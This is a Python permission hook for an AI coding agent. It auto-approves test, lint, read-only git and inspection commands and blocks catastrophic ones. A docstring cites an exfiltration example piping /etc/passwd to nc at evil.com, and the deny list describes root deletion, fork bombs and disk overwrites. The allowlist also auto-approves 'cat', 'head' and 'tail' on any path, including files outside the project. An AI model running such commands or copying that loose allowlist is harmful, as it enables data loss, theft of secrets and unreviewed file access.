#!/usr/bin/env -S uv run --script
# /// script
# requires-python = ">=3.11"
# dependencies = []
# ///
"""
safe_permissions.py - Auto-approve safe commands for smoother workflow.

PermissionRequest hook that auto-approves:
- Test commands (npm test, pytest, go test, cargo test)
- Lint commands (npm run lint, ruff, go vet, cargo check)
- Type check commands (npm run typecheck, mypy, tsc)
- Readonly git commands (status, diff, log, branch)
- Read/Glob/Grep operations within the project directory

All other commands defer to default behavior ("ask").

Configuration via environment variables:
- OMC_SAFE_PERMISSIONS: Set to "0" or "false" to disable auto-approvals
"""

from __future__ import annotations

import os
import re
import sys
from pathlib import Path

# Add parent directory for hook_utils import
sys.path.insert(0, str(Path(__file__).parent))

from hook_utils import (
    RegexCache,
    hook_main,
    log_debug,
    output_empty,
    output_permission,
    parse_bool_env,
    parse_hook_input,
    read_stdin_safe,
)


def is_enabled() -> bool:
    """Check if safe permissions auto-approval is enabled."""
    return parse_bool_env("OMC_SAFE_PERMISSIONS", default=True)

# =============================================================================
# Safe command patterns
# =============================================================================

SAFE_PATTERNS = RegexCache()

# Node.js test/lint/typecheck commands
SAFE_PATTERNS.add("npm_test", r"^npm\s+(test|run\s+(test|lint|typecheck|check|format))", re.IGNORECASE)
SAFE_PATTERNS.add("npx_test", r"^npx\s+(jest|vitest|mocha|eslint|prettier|tsc)", re.IGNORECASE)
SAFE_PATTERNS.add("yarn_test", r"^yarn\s+(test|lint|typecheck|check|format)", re.IGNORECASE)
SAFE_PATTERNS.add("pnpm_test", r"^pnpm\s+(test|lint|typecheck|check|format)", re.IGNORECASE)

# Python test/lint commands
SAFE_PATTERNS.add("pytest", r"^(pytest|python\s+-m\s+pytest)", re.IGNORECASE)
SAFE_PATTERNS.add("ruff", r"^ruff\s+(check|format)", re.IGNORECASE)
SAFE_PATTERNS.add("mypy", r"^mypy\b", re.IGNORECASE)
SAFE_PATTERNS.add("black", r"^black\s+--check", re.IGNORECASE)
SAFE_PATTERNS.add("uv_pytest", r"^uv\s+run\s+(--with\s+\S+\s+)?pytest", re.IGNORECASE)

# Go test/lint commands
SAFE_PATTERNS.add("go_test", r"^go\s+(test|vet|fmt)", re.IGNORECASE)
SAFE_PATTERNS.add("golint", r"^(golint|staticcheck|golangci-lint)", re.IGNORECASE)

# Rust test/lint commands
SAFE_PATTERNS.add("cargo", r"^cargo\s+(test|check|clippy|fmt)", re.IGNORECASE)

# Git readonly commands (safe to run anytime)
SAFE_PATTERNS.add(
    "git_readonly",
    r"^git\s+(status|diff|log|branch|show|ls-files|rev-parse|describe|tag\s+-l|remote\s+-v)",
    re.IGNORECASE,
)

# Make targets that are typically safe
SAFE_PATTERNS.add("make_safe", r"^make\s+(test|lint|check|fmt|format)$", re.IGNORECASE)

# Modern JavaScript/TypeScript test runners
SAFE_PATTERNS.add("vitest", r"^(npx\s+)?vitest\b", re.IGNORECASE)
SAFE_PATTERNS.add("bun_test", r"^bun\s+test\b", re.IGNORECASE)
SAFE_PATTERNS.add("deno_test", r"^deno\s+test\b", re.IGNORECASE)

# Coverage tools
SAFE_PATTERNS.add("coverage", r"^coverage\s+(run|report|html|xml|json|combine|erase)", re.IGNORECASE)
SAFE_PATTERNS.add("codecov", r"^codecov\b", re.IGNORECASE)

# Shell utilities for inspection (readonly)
SAFE_PATTERNS.add("ls_cmd", r"^ls\b", re.IGNORECASE)
SAFE_PATTERNS.add("cat_cmd", r"^cat\b", re.IGNORECASE)
SAFE_PATTERNS.add("head_tail", r"^(head|tail)\b", re.IGNORECASE)
SAFE_PATTERNS.add("wc_cmd", r"^wc\b", re.IGNORECASE)
SAFE_PATTERNS.add("which_cmd", r"^which\b", re.IGNORECASE)
SAFE_PATTERNS.add("echo_cmd", r"^echo\b", re.IGNORECASE)

# Filesystem inspection
SAFE_PATTERNS.add("tree_cmd", r"^tree\b", re.IGNORECASE)
SAFE_PATTERNS.add("file_cmd", r"^file\b", re.IGNORECASE)
SAFE_PATTERNS.add("stat_cmd", r"^stat\b", re.IGNORECASE)
SAFE_PATTERNS.add("du_cmd", r"^du\b", re.IGNORECASE)
SAFE_PATTERNS.add("df_cmd", r"^df\b", re.IGNORECASE)
SAFE_PATTERNS.add("pwd_cmd", r"^pwd$", re.IGNORECASE)
SAFE_PATTERNS.add("dirname_cmd", r"^(dirname|basename|realpath)\b", re.IGNORECASE)

# System info
SAFE_PATTERNS.add("uname_cmd", r"^uname\b", re.IGNORECASE)
SAFE_PATTERNS.add("hostname_cmd", r"^hostname$", re.IGNORECASE)
SAFE_PATTERNS.add("id_whoami", r"^(id|whoami)$", re.IGNORECASE)
SAFE_PATTERNS.add("date_cmd", r"^date\b", re.IGNORECASE)
SAFE_PATTERNS.add("uptime_cmd", r"^uptime$", re.IGNORECASE)

# Version checks (strict — $ anchor prevents trailing args)
SAFE_PATTERNS.add("version_check", r"^(node|python3?|ruby|go|rustc|cargo|npm|pip|uv|git|docker|kubectl|java|bun|deno)\s+(--version|-version|-V|version)$", re.IGNORECASE)

# Dev tool inspection
SAFE_PATTERNS.add("jq_cmd", r"^(jq|yq)\b", re.IGNORECASE)
SAFE_PATTERNS.add("docker_list", r"^docker\s+(ps|images)\b", re.IGNORECASE)
SAFE_PATTERNS.add("kubectl_get", r"^kubectl\s+get\s+(?!secrets?\b)", re.IGNORECASE)


def has_shell_operators(command: str) -> bool:
    """Check if command contains pipes or redirects that could be dangerous.

    Security fix: prevents auto-approving commands like 'cat /etc/passwd | nc evil.com'.
    Simple heuristic - looks for unquoted shell operators.
    """
    return bool(re.search(r'[|><;&`()]', command))


def split_compound_command(command: str) -> list[str] | None:
    """Split command on && and || operators, respecting quotes.

    Returns list of sub-commands, or None if command contains
    bare pipes (| not part of ||) which are unsafe.
    """
    parts: list[str] = []
    current: list[str] = []
    in_single = False
    in_double = False
    i = 0

    while i < len(command):
        c = command[i]

        if c == "'" and not in_double:
            in_single = not in_single
            current.append(c)
        elif c == '"' and not in_single:
            in_double = not in_double
            current.append(c)
        elif not in_single and not in_double:
            if c == '|':
                if i + 1 < len(command) and command[i + 1] == '|':
                    # || operator — split here
                    parts.append(''.join(current).strip())
                    current = []
                    i += 2
                    continue
                else:
                    # Bare pipe — unsafe
                    return None
            elif c == '&' and i + 1 < len(command) and command[i + 1] == '&':
                # && operator — split here
                parts.append(''.join(current).strip())
                current = []
                i += 2
                continue
            elif c == '&':
                # Bare & (background operator) — unsafe
                return None
            elif c in (';', '`', '(', ')'):
                # Semicolons, backticks, subshells — unsafe
                return None
            else:
                current.append(c)
        else:
            current.append(c)

        i += 1

    remaining = ''.join(current).strip()
    if remaining:
        parts.append(remaining)

    return [p for p in parts if p]


def check_redirect_safety(subcmd: str) -> bool:
    """Check if output redirects in a sub-command target safe project paths.

    For > and >>: extracts target path and verifies is_path_in_project().
    For < (input redirect): rejects as unsafe.
    """
    # Reject input redirects
    if re.search(r'<', subcmd):
        log_debug("input redirect found - unsafe")
        return False

    # Check ALL output redirects (>> or >)
    for redirect_match in re.finditer(r'(>>?)\s*(\S+)', subcmd):
        target_path = redirect_match.group(2).strip("'\"")
        if not is_path_in_project(target_path):
            log_debug(f"redirect target {target_path} is outside project - unsafe")
            return False
        log_debug(f"redirect target {target_path} is within project - safe")

    return True  # All redirects safe (or no redirects)


def strip_redirect(subcmd: str) -> str:
    """Remove redirect portion from a sub-command for pattern matching."""
    return re.sub(r'\s*>>?\s*\S+', '', subcmd).strip()


def is_plugin_internal_script(command: str) -> bool:
    """
    Check if command runs a script from within the plugin directory.

    This auto-approves plugin's own scripts regardless of version,
    preventing re-prompts when plugin version changes.

    Args:
        command: The bash command to check.

    Returns:
        True if command references a script within CLAUDE_PLUGIN_ROOT.
    """
    plugin_root = os.environ.get("CLAUDE_PLUGIN_ROOT", "")
    log_debug(f"CLAUDE_PLUGIN_ROOT='{plugin_root}'")
    log_debug(f"command='{command[:200]}'")

    if not plugin_root:
        log_debug("CLAUDE_PLUGIN_ROOT not set, cannot verify plugin script")
        return False

    # Security fix: extract the script path from the command by stripping leading
    # interpreters (python, bash, uv run, etc.) and verify it starts with plugin_root.
    # Substring containment was spoofable (e.g., "rm -rf / #/path/to/plugin").
    stripped = command.strip()
    # Strip common interpreter prefixes to find the actual script path
    interpreter_prefixes = [
        r'^uv\s+run\s+(?:--script\s+)?(?:--with\s+\S+\s+)*',
        r'^python3?\s+(?:-[^\s]+\s+)*',
        r'^bash\s+(?:-[^\s]+\s+)*',
        r'^sh\s+(?:-[^\s]+\s+)*',
    ]
    script_path = stripped
    for prefix_pattern in interpreter_prefixes:
        match = re.match(prefix_pattern, script_path)
        if match:
            script_path = script_path[match.end():].strip()
            break

    # Extract just the first argument (the script path) before any flags/args
    script_path = script_path.split()[0] if script_path.split() else ""

    # Resolve to absolute and verify it lives under plugin_root
    if script_path:
        try:
            resolved = os.path.realpath(script_path)
            plugin_resolved = os.path.realpath(plugin_root)
            if resolved.startswith(plugin_resolved + os.sep) or resolved == plugin_resolved:
                log_debug(f"command script resolves under plugin root: {resolved}")
                return True
        except (OSError, ValueError) as e:
            log_debug(f"path resolution error for plugin check: {e}")

    log_debug("command does not reference a verified plugin script")
    return False


def is_path_in_project(path: str) -> bool:
    """
    Check if a path is within the current working directory.

    Args:
        path: The file path to check.

    Returns:
        True if path is within cwd or is a relative path.
    """
    if not path:
        return False

    cwd = os.getcwd()
    log_debug(f"cwd={cwd}, path={path}")

    # Security fix: resolve relative paths to absolute before checking.
    # A relative path like "../../etc/passwd" is not safe just because it's relative.
    if not os.path.isabs(path):
        path = os.path.join(cwd, path)
        log_debug(f"resolved relative path to: {path}")

    # Resolve to absolute and check if within cwd
    try:
        resolved = os.path.realpath(path)
        cwd_resolved = os.path.realpath(cwd)
        is_within = resolved.startswith(cwd_resolved + os.sep) or resolved == cwd_resolved
        log_debug(f"resolved={resolved}, is_within_cwd={is_within}")
        return is_within
    except (OSError, ValueError) as e:
        log_debug(f"path resolution error: {e}")
        return False


CLAUDE_INTERNAL_DIRS = (".claude/plans", ".claude/notepads", ".claude/tasks")


def is_claude_internal_path(path: str) -> bool:
    """Check if path is within Claude's internal working directories."""
    if not path:
        return False
    cwd = os.getcwd()
    if not os.path.isabs(path):
        path = os.path.join(cwd, path)
    try:
        resolved = os.path.realpath(path)
        cwd_resolved = os.path.realpath(cwd)
        for allowed_dir in CLAUDE_INTERNAL_DIRS:
            allowed_path = os.path.realpath(os.path.join(cwd_resolved, allowed_dir))
            if resolved.startswith(allowed_path + os.sep) or resolved == allowed_path:
                return True
    except (OSError, ValueError):
        pass
    return False


# Catastrophic patterns — hard-deny (moved from danger_blocker.py for PermissionRequest)
CATASTROPHIC_PATTERNS = [
    ("root_delete", re.compile(r"rm\s+(-[a-zA-Z]*r[a-zA-Z]*\s+|.*\s+)/?['\"]?/['\"]?(\s|$)", re.I), "recursive delete of root filesystem"),
    ("home_delete", re.compile(r"rm\s+(-[a-zA-Z]*r[a-zA-Z]*\s+|.*\s+)['\"]?~/?['\"]?(\s|$)", re.I), "recursive delete of home directory"),
    ("sudo_rm_recursive", re.compile(r"sudo\s+rm\s+.*-r", re.I), "sudo recursive delete"),
    ("fork_bomb", re.compile(r":\(\)\s*\{.*\|.*&.*\}\s*;?\s*:", re.I), "fork bomb"),
    ("fork_bomb_named", re.compile(r"\w+\(\)\s*\{.*\w+\s*\|\s*\w+\s*&", re.I), "fork bomb (named variant)"),
    ("dd_device", re.compile(r"dd\s+.*of=/dev/(sd|hd|nvme|vd)", re.I), "overwriting block device"),
    ("mkfs_device", re.compile(r"mkfs.*\s+/dev/", re.I), "formatting block device"),
    ("device_redirect", re.compile(r">\s*/dev/(sd|hd|nvme)", re.I), "redirecting to block device"),
    ("chmod_root", re.compile(r"chmod\s+-R\s+000\s+/", re.I), "removing all permissions from root"),
]


def is_safe_read_tool(tool_name: str, tool_input: dict | str) -> tuple[bool, str | None]:
    """
    Check if a Read/Glob/Grep operation is safe to auto-approve.

    Auto-approves operations within the project directory.

    Args:
        tool_name: The tool being used (Read, Glob, Grep).
        tool_input: The tool's input parameters.

    Returns:
        Tuple of (is_safe, reason_if_safe).
    """
    if tool_name not in ("Read", "Glob", "Grep"):
        return False, None

    # Extract path from tool_input
    if isinstance(tool_input, str):
        path = tool_input
    elif isinstance(tool_input, dict):
        # Read uses file_path, Glob/Grep use path
        path = tool_input.get("file_path") or tool_input.get("path") or ""
    else:
        path = ""

    # If no path specified, Glob/Grep default to cwd which is safe
    if not path and tool_name in ("Glob", "Grep"):
        log_debug(f"{tool_name} with no path defaults to cwd - safe")
        return True, f"{tool_name}_project_dir"

    if is_path_in_project(path):
        return True, f"{tool_name}_project_dir"

    return False, None


def _match_safe_pattern(cmd: str) -> str | None:
    """Check if a single command matches any safe pattern. Returns pattern name or None."""
    for pattern_name in SAFE_PATTERNS.names():
        if SAFE_PATTERNS.match(pattern_name, cmd):
            return pattern_name
    return None


def is_safe_command(command: str) -> tuple[bool, str | None]:
    """
    Check if a command matches any safe pattern.

    Supports compound commands (&&, ||) by checking each sub-command
    independently. Bare pipes are rejected. Output redirects (>, >>)
    are allowed only if the target path is within the project.

    Args:
        command: The bash command to check.

    Returns:
        Tuple of (is_safe, pattern_name_if_matched).
    """
    command = command.strip()

    # First check: plugin internal scripts (version-agnostic)
    if is_plugin_internal_script(command):
        return True, "plugin_internal_script"

    # Simple command (no shell operators)
    if not has_shell_operators(command):
        pattern = _match_safe_pattern(command)
        if pattern:
            log_debug(f"command matched safe pattern: {pattern}")
            return True, pattern
        return False, None

    # Compound command — split on && and || (bare pipes rejected)
    subcmds = split_compound_command(command)
    if subcmds is None:
        log_debug("command contains bare pipe - deferring to user")
        return False, None

    # Check each sub-command independently
    for subcmd in subcmds:
        # Verify redirect targets are within project
        if not check_redirect_safety(subcmd):
            log_debug(f"sub-command has unsafe redirect: {subcmd}")
            return False, None

        # Strip redirect for pattern matching
        base_cmd = strip_redirect(subcmd)

        pattern = _match_safe_pattern(base_cmd)
        if not pattern:
            log_debug(f"sub-command not in safe list: {base_cmd}")
            return False, None

    log_debug("all sub-commands in compound command are safe")
    return True, "compound_safe"


@hook_main("PermissionRequest")
def main() -> None:
    """Main entry point for PermissionRequest hook."""
    # Check if hook is enabled
    if not is_enabled():
        log_debug("safe_permissions disabled via OMC_SAFE_PERMISSIONS")
        output_empty()
        return

    raw = read_stdin_safe()
    data = parse_hook_input(raw)

    if not data:
        log_debug("no input data, passing through")
        output_empty()
        return

    tool_name = data.get("tool_name", "")
    tool_input = data.get("tool_input", {})

    # Handle Write/Edit tools - auto-approve Claude internal paths
    if tool_name in ("Write", "Edit"):
        file_path = tool_input.get("file_path", "") if isinstance(tool_input, dict) else ""
        if is_claude_internal_path(file_path):
            output_permission("allow", f"Auto-approved: {tool_name}_claude_internal")
        else:
            output_empty()
        return

    # Handle Read/Glob/Grep tools - auto-approve within project directory
    if tool_name in ("Read", "Glob", "Grep"):
        log_debug(f"checking {tool_name} tool for project path")
        is_safe, reason = is_safe_read_tool(tool_name, tool_input)
        if is_safe:
            log_debug(f"auto-approving {tool_name} (reason: {reason})")
            output_permission("allow", f"Auto-approved: {reason}")
        else:
            log_debug(f"{tool_name} path outside project, deferring to user")
            output_empty()
        return

    # Handle Bash tool
    if tool_name != "Bash":
        log_debug(f"tool is {tool_name}, not handled - passing through")
        output_empty()
        return

    # Get the command
    if isinstance(tool_input, str):
        # Sometimes tool_input is just the command string
        command = tool_input
    else:
        command = tool_input.get("command", "")

    if not command:
        log_debug("no command found in tool_input")
        output_empty()
        return

    log_debug(f"checking command: {command[:100]}...")

    # Check catastrophic patterns — deny if not already approved via settings.json
    for pattern_name, pattern_regex, reason in CATASTROPHIC_PATTERNS:
        if pattern_regex.search(command):
            log_debug(f"catastrophic command detected: {reason}")
            output_permission("deny", f"Blocked: {reason}")
            return

    # Check if command is safe
    is_safe, pattern = is_safe_command(command)
    if is_safe:
        log_debug(f"auto-approving safe command (pattern: {pattern})")
        output_permission("allow", f"Auto-approved: {pattern}")
    else:
        log_debug("command not in safe list, deferring to user")
        output_empty()


if __name__ == "__main__":
    main()
